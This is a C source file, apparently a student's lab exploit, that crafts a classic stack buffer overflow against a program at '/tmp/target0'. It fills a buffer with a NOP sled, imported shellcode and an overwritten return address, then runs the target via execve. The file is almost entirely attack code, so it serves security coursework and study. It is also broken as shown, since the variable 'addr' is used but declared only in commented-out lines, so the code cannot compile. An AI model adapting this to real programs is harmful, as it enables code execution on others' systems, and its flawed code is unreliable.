#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

#define BUFFER_SIZE 408

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

int main(void)
{
  char *args[3]; 
  char buffer[BUFFER_SIZE]; // Make larger size as target program?
  char *env[1];
  
  // clear buffer
  // memset(buffer, 0, BUFFER_SIZE); // 0 bytes will stop strcpy?!?!?

  // Initialize buffer with NOP instructions
  memset(buffer, 0x90, BUFFER_SIZE-4);

  // Copy over shellcode
  memcpy(buffer + 203, shellcode, sizeof(shellcode)-1); // There's a 0 byte at the end of this?!?!
  printf("Size of shellcode: %d\n", sizeof(shellcode));

  // TODO: Copy a bunch of stack pointer address
  unsigned long sp = get_sp();
  unsigned long target = sp - 768; // 0x300 is 768 in decimal
  printf("Stack pointer (ESP): 0x%x\n", sp);
  printf("Stack pointer - 0x300: 0x%x\n", target);

  // What does memsetting buffer with stack pointer target look like?
  // memset(&buffer, target, 399); // this is wrong
  // buffer[407] = 191; // 0xbf
  // buffer[406] = 255; // 0xff
  // buffer[405] = 242; // 0xf2
  // buffer[404] = 200; // 0xc8
  // char addr[] = "\xc8\xf2\xff\xbf";
  // addr[3] = 0xbf;
  // addr[2] = 0xff;
  // addr[1] = 0xf2;
  // addr[0] = 0xc8;
  // memcpy(buffer + 400, addr, sizeof(addr));
  // memset(buffer + 1024, 0x90, sizeof(addr));
  memcpy(buffer+404, addr, sizeof(addr)-1);
  // memcpy(buffer+380, shellcode, sizeof(shellcode));
  printf("Size of addr: %d\n", sizeof(addr));

  // Print out buffer for testing
  for (int i = 0; i < BUFFER_SIZE; i++) {
    printf("Buffer[%d] = 0x%x\n", i, buffer[i]); 
  }

  // TODO: Just testing to break the stack
  // memset(buffer, 'A', BUFFER_SIZE);

  args[0] = TARGET; // Must contain filename of file being executed
  // args[1] = "student"; // TODO: Replace with shell code
  // args[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // 399 'A's
  args[1] = buffer;
  args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array

  // printf("args stack target: 0x%x\n", args[1]);
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
